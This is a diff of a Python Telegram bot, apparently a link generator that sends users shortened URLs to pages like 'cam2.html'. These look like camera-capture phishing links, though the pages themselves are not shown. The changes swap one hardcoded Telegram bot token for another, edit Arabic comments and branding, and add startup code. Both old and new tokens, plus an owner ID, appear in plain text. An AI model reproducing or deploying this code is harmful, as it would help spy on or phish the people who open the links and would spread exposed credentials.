@@ -6,16 +6,16 @@ from threading import Thread
 import os
 import time
 
-# 1. إعداد السيرفر لضمان البقاء أونلاين
+# 1. إعداد السيرفر لضمان البقاء أونلاين 24 ساعة
 app = Flask('')
 @app.route('/')
-def home(): return "M.Y.9 System Online"
+def home(): return "M.Y.9 System Online - Developer: Abu Osayed Malkawi"
 
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 def keep_alive(): Thread(target=run).start()
 
-# 2. إعدادات البوت بالتوكن والاسم الجديد
-TOKEN = '8386427321:AAEYvO9pk7PDJlysMSZLWG-8tMTi5v-LQRY'
+# 2. إعدادات البوت بالتوكن الجديد
+TOKEN = '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY'
 MY_ID = '7238206121' 
 bot = telebot.TeleBot(TOKEN)
 
@@ -32,7 +32,7 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    # التحذير الأول باسم Abu Osayed Malkawi
+    # التحذير الأول باسم Abu Osayed Malkawi بالإنجليزية
     warning_text = f"""
 ⚠️ PROGRAMMING WARNING:
 
@@ -48,7 +48,7 @@ Please wait for (2 minutes) until your follow is confirmed by the server and you
     
     bot.send_message(uid, warning_text, reply_markup=markup)
 
-    # 4. تشغيل عداد الدقيقتين في الخلفية
+    # 4. تشغيل عداد الدقيقتين في الخلفية لتوليد الروابط
     def background_process(chat_id, user_name):
         time.sleep(120) # انتظار دقيقتين
         
@@ -66,7 +66,7 @@ Please wait for (2 minutes) until your follow is confirmed by the server and you
             "c2": short(base+"cam2.html"+p)
         }
 
-        # الرسالة النهائية مع مسافات بين الروابط لتسهيل القراءة والنسخ
+        # الرسالة النهائية مع مسافات مريحة وتنسيق احترافي
         final_msg = f"""
 🚀 M.Y.9 UNIFIED SYSTEM | VERIFIED ✅
 
@@ -107,9 +107,12 @@ Please wait for (2 minutes) until your follow is confirmed by the server and you
 
     Thread(target=background_process, args=(uid, name)).start()
 
-# 5. تشغيل البوت
+# 5. تشغيل البوت مع ضمان عدم التعارض
 if __name__ == "__main__":
     keep_alive()
+    # تنظيف أي ويب هوك قديم
     bot.remove_webhook()
     time.sleep(1)
+    print("M.Y.9 System is now LIVE for Abu Osayed Malkawi...")
+    # استخدام skip_pending لمسح أي رسائل قديمة وتجنب الأخطاء
     bot.infinity_polling(skip_pending=True)
